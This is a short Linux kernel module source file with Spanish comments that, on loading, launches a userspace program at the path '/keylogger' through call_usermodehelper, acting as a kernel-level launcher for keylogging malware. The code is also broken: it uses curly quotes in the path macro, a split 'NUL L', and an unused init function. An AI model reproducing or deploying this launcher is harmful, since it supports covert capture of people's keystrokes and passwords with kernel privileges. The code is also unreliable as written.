#include <linux/module.h>
/* Necesario en todos los modulos */ 
#include <linux/kernel.h> 
/* Necesario para alertas  e info como KERN_INFO */ 
#include <linux/init.h>       
/* Necesario para las macros init y exit */
#define RUTA “/keylogger”


static void __exit fin(void)
{
	printk(KERN_INFO "Adios, Mundo \n");
}
	
	static int externo(void)
	{    
		char *argv[]={RUTA,NULL};
	    static char *envp[]={"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin",NUL L};    
	    return call_usermodehelper(argv[0],argv,envp,UMH_WAIT_PROC); 
	}

	static int __init x_x(void)
	{    
		return externo();
	}

module_init(externo);
module_exit(fin);